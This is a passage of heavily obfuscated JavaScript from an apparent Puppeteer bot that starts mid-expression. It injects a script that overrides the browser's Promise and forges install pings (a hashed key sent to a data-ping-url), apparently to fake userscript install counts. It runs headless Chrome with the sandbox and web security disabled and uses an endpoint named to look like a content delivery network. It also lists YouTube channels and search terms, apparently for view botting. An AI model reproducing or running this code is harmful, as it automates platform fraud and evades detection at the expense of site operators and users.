0x7e5 * -0x1 + -0x259f + -0xd5 * -0x37) << y[-0x1 * 0x466 + -0x3 * 0x5c8 + 0x15c1 * 0x1 & N++], P[N >> 0x1bbc + 0x1d * -0x10b + 0x285] |= (0x14 * -0x11 + 0x9bb + -0x7e7 | L >> -0xdfb + 0xf16 * -0x2 + 0x107 * 0x2b & 0xbf6 + 0x13 * 0xb8 + -0x195f) << y[0x812 + 0x2e7 * 0x1 + -0x1 * 0xaf6 & N++], P[N >> 0x47a + -0x229a + 0x1e22] |= (-0x3a0 + 0x8 * -0x20e + -0x1c * -0xbc | -0x132e + 0x1ec + 0x1181 & L) << y[-0x6f8 + -0x32c * -0x2 + 0xa3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x20bb + -0x4b7 + 0x25b2 ? (this['block'] = P[-0x689 * 0x5 + -0x6f6 + 0x27b3 * 0x1], this['start'] = N - (0x581 + 0x1a * 0xc5 + -0x1943), this['hash'](), this['hashed'] = 0x167 * -0x11 + -0x1365 + -0x1 * -0x2b3d) : this['start'] = N;
                }
                return this['bytes'] > -0x7e753a64 + -0x16b * -0x855d2d + 0x2 * 0x60ad0dca && (this['hBytes'] += this['bytes'] / (0x1d315abd8 + 0x1421bbac * 0x10 + -0x3364604 * 0xa6) << 0x89b + 0x119b * 0x1 + -0x262 * 0xb, this['bytes'] = this['bytes'] % (-0x1576614d4 + -0xe511208 + -0x534a * -0x75e56)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x10a6 + 0x267d + -0x3722;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x173 + 0x1bd0 + -0x1d33] = this['block'], J[K >> -0x100a + -0x2156 + 0x3162] |= x[-0x2e4 + -0xfce + 0x12b5 & K], this['block'] = J[0xff5 + 0x6dd * -0x3 + 0x4b2], K >= -0x5 * 0x575 + 0x138 * -0x11 + 0x3039 && (this['hashed'] || this['hash'](), J[-0x117 * -0xc + -0x2 * 0x9f7 + -0x36d * -0x2] = this['block'], J[-0x25cf * 0x1 + 0x124a * -0x2 + 0x4a73] = J[0x1e4b + 0x114f + -0x1 * 0x2f99] = J[0x4 * -0x853 + 0x1c6 + 0x8 * 0x3f1] = J[-0x1366 * 0x1 + 0x1b * -0x30 + -0x1 * -0x1879] = J[0xd * -0x264 + 0x9b * -0x2 + 0x204e] = J[-0x13f2 + 0x48b * -0x7 + 0x33c4] = J[-0x82b + 0x5 * 0x59 + 0x2 * 0x33a] = J[0x1c * 0x61 + -0x1 * -0x8fa + -0x685 * 0x3] = J[-0x1a5 * 0x7 + -0x1 * -0x1037 + -0x17 * 0x34] = J[0x13b5 + 0x1029 * -0x2 + 0xca6] = J[-0x1 * 0x20cf + -0x13a0 + 0x85 * 0x65] = J[-0x1d32 * 0x1 + 0x7 * -0x577 + 0x437e] = J[0x71f * -0x5 + -0x202d * -0x1 + 0x37a] = J[-0x2 * -0xdfd + 0x334 + -0x1 * 0x1f21] = J[-0x1546 + -0x1ada + 0x302e] = J[-0x10af + -0x10ab + -0x3 * -0xb23] = 0x261 + 0x1e77 + -0x20d8), J[-0x11 * -0x79 + -0x19 * 0x76 + 0x38b] = this['hBytes'] << -0x6d * -0x2e + 0x3 * -0x9a3 + 0x956 | this['bytes'] >>> -0x1 * 0x2471 + 0xaba * -0x1 + -0x22 * -0x164, J[-0x811 * 0x4 + -0x1e22 + 0x3e75] = this['bytes'] << -0x145 * 0x13 + -0x22c8 + 0x3aea, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * 0x5f9 + -0x6 * -0x3d2 + -0x1 * 0x1cd5; J < -0x5 * -0x78b + 0x3 * 0x971 + -0x41ba; ++J)
                K = Q[J - (0x4ac * 0x7 + -0x1793 + -0x91e * 0x1)] ^ Q[J - (0x71 * 0x47 + -0x8bd * -0x4 + -0x4243)] ^ Q[J - (-0x1 * 0x1e72 + 0x531 * -0x5 + 0x3875)] ^ Q[J - (-0x9a2 + 0x1ae8 + -0x1136)], Q[J] = K << 0x1c60 + -0x1696 + 0x1 * -0x5c9 | K >>> -0x3b8 * -0x8 + 0x6ee * -0x5 + 0x505;
              for (J = -0x21 * -0x11 + -0x7 * -0x305 + 0x4 * -0x5d5; J < -0x4 * 0xce + -0x1b55 + -0x1 * -0x1ea1; J += -0x1679 + -0x2ce + 0x194c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x43e + 0x682 * -0x1 + 0xac5 | L >>> -0x1b * -0xf + -0x1690 + 0x2 * 0xa8b) + (M & N | ~M & O) + P + (0xb21f8e84 + 0xdb22b6 * 0x78 + 0xbe555a3b * -0x1) + Q[J] << 0xa * 0x355 + -0xd67 + -0x13eb) << -0x2698 + -0x56 * -0x36 + 0x1479 | P >>> 0xd52 + 0x131 * -0x16 + 0xcff) + (L & (M = M << -0x3b * -0x15 + -0x28f + -0x22a | M >>> 0x15d * -0x3 + 0x24fe + 0x3 * -0xaf7) | ~L & N) + O + (-0x3bc91183 + -0x2d9443cf + 0x13f6327 * 0x9d) + Q[J + (-0x1425 + 0x7 * -0xa5 + 0x6b * 0x3b)] << -0x4d3 + -0xbd5 * -0x2 + -0x35 * 0x5b) << -0x963 * -0x1 + -0x2123 + 0x17c5 | O >>> 0x1 * 0x19ed + 0x1 * 0x1508 + 0xf9e * -0x3) + (P & (L = L << 0xe9 * -0x7 + 0x1cdd + -0x1660 | L >>> 0x127 * 0x9 + 0x2584 + -0x2fe1) | ~P & M) + N + (0x3a1e8b56 + 0x8d4799ff + -0x6ce3abbc) + Q[J + (0x31f + -0x534 + 0x217)] << -0x996 * -0x1 + -0xc8b + 0x1 * 0x2f5) << 0x13 * -0x1f3 + 0x261f * 0x1 + -0x111 | N >>> -0x1 * 0x1f57 + -0x804 + 0x2 * 0x13bb) + (O & (P = P << 0x1dea + -0xdd * -0x18 + -0x3284 | P >>> -0x22e4 + 0x4ab * -0x8 + 0x483e * 0x1) | ~O & L) + M + (0x20defd09 + -0x19785e * -0x30d + -0x1410ba36) + Q[J + (-0x8cf + 0x55 * 0x3f + -0xc19)] << -0xca * 0x20 + 0x99a * -0x3 + -0x360e * -0x1) << 0xc + 0x802 + -0x1 * 0x809 | M >>> -0xddf * 0x1 + -0x5 * -0x193 + 0x3 * 0x209) + (N & (O = O << 0x19bb * -0x1 + -0x23d0 + 0x3da9 | O >>> 0x99 * -0x15 + -0x138b + 0x201a) | ~N & P) + L + (-0x1b5af42d * 0x4 + -0x2d78b1a0 + 0xf566fbed) + Q[J + (0x249e + 0x256 * -0x6 + -0x1696)] << -0x2ae + -0xcc5 * -0x2 + -0x16dc, N = N << 0x7f7 + -0x9b5 * -0x1 + -0x118e | N >>> 0x11f * 0x7 + -0x6d3 + 0x1a * -0xa;
              for (; J < 0x5 * -0x5ad + -0x13 * 0x2e + 0x1ff3; J += -0x1b9d + -0x1c65 * 0x1 + 0x2ab * 0x15)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1c7c + -0x24af + -0x2 * -0x2098 | L >>> 0x471 * -0x3 + -0x743 + -0x1 * -0x14b1) + (M ^ N ^ O) + P + (-0xd2a06a1a + -0x2f * 0x46e2765 + -0x16fd2 * -0x170ab) + Q[J] << -0x1d35 + 0x3f1 + -0x1ce * -0xe) << -0x1 * 0x1f23 + 0x21ee + -0x8e * 0x5 | P >>> -0x4 * -0x981 + -0x2b * -0x8f + -0x3dee) + (L ^ (M = M << -0xda2 + 0x666 + 0x75a | M >>> -0x5c6 * 0x6 + 0xe14 + 0x2 * 0xa49) ^ N) + O + (-0x3bef0 * 0x1539 + -0x36 * -0x2787c95 + 0x38eed7a3) + Q[J + (0x1ab5 + 0xe89 + -0x293d)] << -0x38d * 0x7 + -0x4e * -0x1 + 0x1 * 0x188d) << 0x1 * 0xae7 + 0x1 * -0x171a + 0xc38 | O >>> 0x15f2 + 0x1 * 0x1dc5 + -0x339c) + (P ^ (L = L << -0x2 * 0x4c4 + 0xb8b * 0x1 + -0x1e5 | L >>> 0x128c + -0x1a * 0xd + -0x1138) ^ M) + N + (0x1 * 0xa71bc5dc + 0x7c18025e + 0xb459dc99 * -0x1) + Q[J + (-0x1f49 + -0x248c + 0x43d7)] << 0x614 + 0x843 + -0xe57) << -0xb31 + -0x144c + 0x1f82 * 0x1 | N >>> 0x49 * -0x14 + 0xfec + -0xa1d) + (O ^ (P = P << 0x15e0 + -0x1d5c + 0x79a | P >>> -0x8a6 + -0xd74 + 0xa * 0x236) ^ L) + M + (0x7b6dee34 + 0x98cce3e7 * -0x1 + 0x8c38e154) + Q[J + (0x2b1 * -0x1 + -0xb97 * 0x3 + 0x2579)] << 0x1 * -0x23db + -0x3 * 0x7a + 0x2549) << -0x1dd7 + 0x3cd * 0x3 + -0xbd * -0x19 | M >>> -0x21b + -0x1 * 0x169c + 0x3 * 0x846) + (N ^ (O = O << -0x1 * 0x2087 + -0xc79 + 0x20d * 0x16 | O >>> 0xd68 + -0x1 * -0x925 + -0x168b) ^ P) + L + (-0xcf476b09 + -0x1082 * -0xcf476 + 0x6845d2be) + Q[J + (0x2204 + -0x1019 + 0x1 * -0x11e7)] << -0x119 * 0x19 + 0x1b58 + -0x5 * -0x5, N = N << 0x1 * -0x5ff + 0x31f * -0x1 + 0x93c | N >>> -0x68a + -0x152f + 0x1bbb;
              for (; J < 0xf4c + -0x799 * 0x3 + 0x7bb; J += 0x19 * -0xf8 + 0x23f5 * -0x1 + 0x3c32)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5d5 * -0x4 + 0x718 + 0x1 * -0x1e67 | L >>> 0x183c + 0xdb * 0x2c + -0x3dc5) + (M & N | M & O | N & O) + P - (-0x5dd22c82 + -0xc3cb1090 + 0x74b * 0x3730e2) + Q[J] << 0x2 * -0xc6d + 0x12e2 + -0x1 * -0x5f8) << 0x1079 + -0xd89 + -0x2eb | P >>> 0x4b * -0x5a + 0x1203 * -0x1 + 0x92 * 0x4e) + (L & (M = M << -0x20aa + -0x2 * 0x12be + -0x2 * -0x2322 | M >>> -0x9c + 0x22a3 + 0x3 * -0xb57) | L & N | M & N) + O - (0xb4d4ee99 * -0x1 + -0x3b1dd85d + 0x21 * 0xab12eda) + Q[J + (-0x583 + 0x26ce + -0x214a)] << 0x14ac + 0x84d + -0x1cf9) << 0x1957 + 0xd5c + 0x1 * -0x26ae | O >>> -0x8a4 + -0x6d7 * 0x1 + 0x69 * 0x26) + (P & (L = L << 0xdfd * 0x2 + 0x26a4 * -0x1 + 0xac8 | L >>> 0x70f + 0xbfe + -0x130b) | P & M | L & M) + N - (-0x2b * 0x2c91d8d + 0x5 * 0x882affa + -0x1b28f847 * -0x7) + Q[J + (-0x17b * 0x6 + -0x1702 + -0x3 * -0xaa2)] << 0x305 + -0x25a9 * 0x1 + 0xc * 0x2e3) << -0x89 * -0x43 + 0x2302 + -0x8 * 0x8db | N >>> -0x20d5 + 0x1768 + 0x8 * 0x131) + (O & (P = P << -0x193e + -0xf * -0x18d + 0x219 | P >>> 0x736 + -0x2c2 * 0x1 + 0x239 * -0x2) | O & L | P & L) + M - (0xaa072e9f + -0x12a2dd * -0x149 + -0x51163980) + Q[J + (0x1dbf + -0xe6 * 0x17 + -0x912)] << -0x126f + -0x519 + 0x8 * 0x2f1) << -0x214d + 0x2579 + -0x427 | M >>> -0x2 * 0x8fd + -0x18c4 + 0x2ad9) + (N & (O = O << 0xe87 * -0x1 + -0x71c * -0x5 + 0x14e7 * -0x1 | O >>> 0x137d + -0x49 * 0x31 + 0x11a * -0x5) | N & P | O & P) + L - (0x17b242a0 + 0x1c52e0e9 + 0x3cdf1f9b) + Q[J + (-0x1279 * 0x2 + 0x10 * -0x1e7 + 0x2 * 0x21b3)] << -0x213f * 0x1 + 0x23 * -0x7 + -0x2 * -0x111a, N = N << 0x10bc + -0x48c + -0x6 * 0x203 | N >>> -0x18dd + 0x156 * 0xa + 0xb83 * 0x1;
              for (; J < -0x1c98 + -0x2412 + -0x1 * -0x40fa; J += -0xc3c * 0x1 + 0x21c2 + -0x1581)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x26da + 0x4 * 0x557 + 0x1183 | L >>> 0x2 * -0xbdf + -0x239e + -0x1 * -0x3b77) + (M ^ N ^ O) + P - (-0x1ad43b42 + -0x8 * -0x1e0f07d + 0x4169f584) + Q[J] << 0x3 * -0x337 + -0x43 * -0x13 + 0x4ac) << 0x1e16 + 0x5 * -0x2c0 + 0x1051 * -0x1 | P >>> -0xd17 * 0x1 + -0xf0a + -0x22c * -0xd) + (L ^ (M = M << 0x25df + 0x757 * 0x5 + -0x4a74 | M >>> -0x1 * -0xa3d + 0x4 * -0x2b9 + 0xa9) ^ N) + O - (0xc * 0x3f99972 + -0x596e1cfc + -0x4402 * -0x166e7) + Q[J + (0x10bd * -0x2 + -0x10c9 + -0x2 * -0x1922)] << 0x1c * 0xc7 + 0x1 * 0x2ef + 0x1 * -0x18b3) << 0x1010 + 0x118d + -0x2198 | O >>> -0x8a3 * 0x1 + -0x20 + -0xe3 * -0xa) + (P ^ (L = L << 0x1e01 * -0x1 + 0x15c6 + 0x859 | L >>> 0x1b53 + -0x2 * 0xd31 + -0xef * 0x1) ^ M) + N - (0x9894 * -0x4583 + -0x3fd98f07 * -0x1 + -0x1057 * -0x1e8b9) + Q[J + (0x1f9d + -0x25c4 + 0x629)] << -0x7b * -0x2f + 0x1be * -0x1 + -0x14d7) << -0x172d * -0x1 + -0x701 + -0x1 * 0x1027 | N >>> -0xb2 * -0x34 + 0xcb4 * -0x1 + -0x8b * 0x2b) + (O ^ (P = P << 0x2 * 0xd10 + 0x1d52 * 0x1 + 0x4 * -0xdd5 | P >>> -0x5 * -0x38b + 0x233f * 0x1 + -0x34f4) ^ L) + M - (0x2ae * 0x25a2bb + -0x4 * -0x15c03d + -0x2f93d3e4) + Q[J + (-0x929 + -0x1 * 0x2708 + 0x3034)] << -0x1159 * 0x2 + 0x4f6 + 0x1dbc) << -0x40 + -0x63f + 0x6 * 0x116 | M >>> -0x3 * 0x7d5 + -0x7 * 0x52d + 0x3bd5) + (N ^ (O = O << -0xd * 0x1d7 + -0x1 * -0x222b + -0xa22 | O >>> -0xb * -0x14f + -0x2fc * -0xc + -0x3233) ^ P) + L - (-0xa3ad547 + 0x61cf68ee + -0x953f * 0x3a43) + Q[J + (-0x188f + 0x110b + 0x788)] << -0x20 * -0x5c + -0x1420 + 0x8a0, N = N << -0x1a9c + -0x18bc + 0x3376 | N >>> -0x588 + -0x1a88 + -0x2 * -0x1009;
              this['h0'] = this['h0'] + L << -0xd * 0x2b4 + -0x18b4 + -0x77b * -0x8, this['h1'] = this['h1'] + M << 0x16 * 0xf1 + -0x1ec3 + -0x53 * -0x1f, this['h2'] = this['h2'] + N << 0x677 + 0x1 * -0xde + -0x599 * 0x1, this['h3'] = this['h3'] + O << -0x1b13 * -0x1 + 0x24a7 + 0x1fdd * -0x2, this['h4'] = this['h4'] + P << -0x3 * -0x29d + -0x47 * 0x2a + -0x27 * -0x19;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x5b4 * -0x6 + -0x5b0 + 0x1a * 0x18a & -0x20a9 * -0x1 + 0x6a3 * 0x1 + -0x273d] + w[J >> 0x1f4d * 0x1 + -0xf62 * 0x1 + -0xfd3 & -0x10a + -0x2495 + 0x1a * 0x173] + w[J >> 0x2ed + -0x71 * 0xb + -0x1 * -0x202 & -0x1ea9 + 0x1628 + 0x112 * 0x8] + w[J >> -0x767 + 0x2b * 0xb + 0x59e & -0x208a + -0xa * -0x207 + 0xc53 * 0x1] + w[J >> 0x1 * 0x1965 + -0x4 * -0x8bc + 0x57b * -0xb & 0x1 * 0x1ba9 + 0x238d + -0x3 * 0x150d] + w[J >> -0x1df6 + -0x119 * -0x7 + 0x1 * 0x164f & 0xa91 * 0x1 + -0x2 * -0x117b + -0x2d78] + w[J >> 0x9be + 0x197 * -0x4 + 0x1 * -0x35e & 0xb4b * 0x2 + 0x191 * -0xa + -0x6dd * 0x1] + w[0x7c4 + -0xdab + 0x5f6 & J] + w[K >> -0x90f + -0x1 * 0x1469 + 0x1d94 & 0x78b + 0x3aa * -0x1 + -0x3d2] + w[K >> 0x1d * 0xfb + 0x164 * -0x18 + 0x509 & 0x305 + 0x16f * -0x12 + 0x16d8] + w[K >> 0xf38 * -0x2 + 0x1 * 0x23a7 + -0x523 & -0x2118 + 0x2 * -0x53e + 0x2ba3] + w[K >> 0x34 + 0xa02 + 0x1 * -0xa26 & 0x207c + 0xd * 0x8b + -0x277c] + w[K >> -0x1a2d + 0x1 * -0x1297 + -0x6 * -0x778 & -0x1694 + -0x152 + 0x17f5] + w[K >> 0x4 * -0x7c6 + -0x1 * -0x1a78 + -0x254 * -0x2 & 0xd61 + -0xcb * -0x11 + -0x1acd] + w[K >> -0x1866 + -0x9a2 + 0x220c & 0xb15 * 0x2 + -0x1 * 0x1499 + -0x182] + w[0x1 * 0xd13 + 0x21 * 0x125 + 0x32c9 * -0x1 & K] + w[L >> -0xa * -0x346 + 0x14ba + -0x355a & -0x644 * 0x1 + 0x18ff + -0x4 * 0x4ab] + w[L >> 0x15c6 + -0xdca + 0x194 * -0x5 & -0x4 * 0x4fd + 0x33 * -0x37 + -0x2 * -0xf7c] + w[L >> 0x11ce * -0x1 + 0x19e5 + 0x803 * -0x1 & 0x170 + -0x14ff + 0x3e * 0x51] + w[L >> 0x3 * -0x879 + -0x725 * 0x1 + 0x90 * 0x3a & 0x93b + -0x1b3c + -0x1 * -0x1210] + w[L >> 0x88 + -0xb * 0x26 + 0x126 & 0x1daf + -0x2237 * 0x1 + -0x19 * -0x2f] + w[L >> -0x4 * -0x2bf + 0xb * 0x3d + 0x1 * -0xd93 & -0x3 * 0xb3d + -0x1c4c + 0x3e12] + w[L >> -0x4cc * -0x1 + -0x7a8 + -0x8 * -0x5c & 0x49 * -0x22 + -0x34e + 0xd0f] + w[0xdf * -0xe + -0xddb * -0x1 + -0x1 * 0x19a & L] + w[M >> -0x2402 + 0x11fe + 0x122 * 0x10 & -0x1 * 0xc9 + 0x15c + 0xc * -0xb] + w[M >> -0x1029 * 0x1 + -0x1edf * 0x1 + -0x1d0 * -0x1a & 0x1 * 0x1567 + 0x1 * 0x171d + -0x2c75] + w[M >> -0x3 * -0x872 + -0xd4c + -0xbf6 & -0x2 * 0xa5e + 0x29 * -0x57 + 0x22ba] + w[M >> 0x154a + -0x4c7 * -0x1 + -0x7 * 0x3b7 & -0x1261 * 0x2 + -0x1a5e + 0x19 * 0x287] + w[M >> -0xc69 * -0x1 + 0x1b * 0x143 + -0xf7a * 0x3 & 0x1e16 + -0x1c97 + -0x170] + w[M >> -0x1eea + -0x199 * -0x10 + 0x2 * 0x2b1 & -0x36 * 0x6b + -0x160b + 0x2cac] + w[M >> 0x79 * 0x11 + -0xd * -0x2a5 + 0x4b6 * -0x9 & 0x10bf * -0x2 + -0x1 * -0x19b5 + 0x7d8] + w[-0x3 * -0xc27 + -0x25f9 * -0x1 + -0x4a5f & M] + w[N >> -0x1b * -0x4f + 0x599 * 0x5 + -0x2436 & 0x1d6 + 0x2317 * 0x1 + -0x24de] + w[N >> 0x1 * -0x5d1 + -0x23da + 0x29c3 & -0x105f + 0xb2a + 0x544 * 0x1] + w[N >> -0x1c5 + 0x42d * -0x5 + -0x1 * -0x16ba & -0x716 * -0x1 + -0x1af6 + 0x13ef] + w[N >> -0x13c7 + 0x1 * -0x229f + -0x3676 * -0x1 & 0x10ea + 0xc3 * 0x31 + -0x5 * 0xad6] + w[N >> 0x1 * -0x1369 + 0x3fb * -0x1 + 0xc8 * 0x1e & 0xdbe * -0x1 + 0x8af + 0xa * 0x83] + w[N >> 0x1bed * -0x1 + -0x195f + 0xd55 * 0x4 & 0x5 * -0x455 + -0x325 + -0x13 * -0x14f] + w[N >> -0x11 * -0xd6 + -0xf3f + -0x1 * -0x10d & -0x1a + 0x891 * -0x1 + -0x1 * -0x8ba] + w[-0x1 * 0x982 + 0xcc8 + -0x337 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x6d9 + -0xd * -0xd + -0x76a & -0x5 * -0x212 + -0x1ae7 + -0x1 * -0x118c,
                J >> -0x189e + -0x6 * -0x29f + 0x8f4 & -0x2 * -0x84a + 0x305 * -0x2 + 0x98b * -0x1,
                J >> -0x1dab + 0x243e + -0x68b & -0x4 * 0xf1 + 0x15d * -0x5 + 0xb94,
                -0x36 * -0x4d + 0xb * 0xcd + -0x180e & J,
                K >> 0x1ea7 + 0x270b + -0x97 * 0x76 & 0x161 + 0x2 * -0x839 + 0x1010,
                K >> 0xa7b * -0x2 + 0x3 * -0x602 + 0x54 * 0x77 & -0x128b * 0x1 + -0x6cc * -0x5 + -0xe72,
                K >> -0x1fa8 + -0x4d + 0x1ffd & -0x19c4 + -0x1 * 0x581 + 0x2044,
                -0x3 * -0x6ff + -0xdf7 + -0x607 & K,
                L >> 0x1c2d + 0x2089 + -0x3c9e & -0x191d + 0x12d9 * -0x1 + 0x2cf5,
                L >> -0x2 * 0x23d + 0xa5e + -0x4 * 0x175 & 0x2b3 * 0x1 + -0x20d0 + -0x16a * -0x16,
                L >> 0x1b46 + -0xa * 0x15 + 0x1a6c * -0x1 & 0xa7c + -0x1328 + 0x9ab,
                -0x1 * 0x1b81 + 0x710 + 0x1570 & L,
                M >> 0x1c6c + 0xd6 * -0x29 + 0x5f2 & 0xea1 + -0x4 * -0x783 + -0x2bae,
                M >> -0x2136 + 0x12f1 + -0xe55 * -0x1 & 0x3 * 0x1ad + -0x1160 * -0x1 + 0xab4 * -0x2,
                M >> -0x2 * 0x12c4 + -0x215e * -0x1 + 0x432 & -0x1401 + -0x3 * -0x901 + -0x1 * 0x603,
                0x233b * -0x1 + 0x480 + 0x1fba & M,
                N >> 0x1d4a + 0x6c2 + -0x23f4 & 0x2203 + -0xdf * 0x1 + -0x279 * 0xd,
                N >> 0x1 * 0xf85 + -0x22 * -0xf9 + -0x3087 & -0xd * 0x29 + 0x2 * 0xb14 + 0x42 * -0x4a,
                N >> 0x1 * -0xc8d + 0x2076 + -0x1 * 0x13e1 & 0xe53 + -0x3a4 + -0x9b0,
                0x1313 + 0xed + -0x1301 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2087 + 0xe6 + 0x1 * -0x2159), (K = new DataView(J))['setUint32'](-0x1 * 0x5dc + -0x2 * -0x418 + -0x254, this['h0']), K['setUint32'](0x14 * 0x5f + 0x119 * 0x11 + -0x1 * 0x1a11, this['h1']), K['setUint32'](-0x16b * 0x13 + -0x20ea + 0x3be3 * 0x1, this['h2']), K['setUint32'](0x26c9 + -0x1 * -0xd21 + -0x8a5 * 0x6, this['h3']), K['setUint32'](-0x1f7f + 0x1212 + 0xd7d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1a15 + 0xd * 0xef + -0x46 * -0x33];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x136c * 0x1 + 0x5dc + 0xd90 * 0x1;
            J[-0x217b + -0x452 + 0x1 * 0x25cd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x2111 + -0x3 * 0x377 + -0x16ac] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x53 * 0x3b + -0x116f + 0x1b1 * -0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1ab9 + -0x833 * -0x1 + -0x22eb;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2617 + 0x93a * 0x1 + 0x2975 * -0x1), Promise['resolve'](-0x772 + -0x1d56 + -0x24c9 * -0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1d6a + 0x4 * 0x6b9 + 0x286; j < 0x1c40 + -0x4dc * -0x8 + -0x431f * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x1635 + -0x17fe + 0x4d73 + (-0x982 * -0x3 + 0x30b + -0x13d9) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * -0x1987 + 0x49 * -0x22 + -0xfd2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x41 * 0x46 + -0x1195 * 0x2 + 0x1164; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + 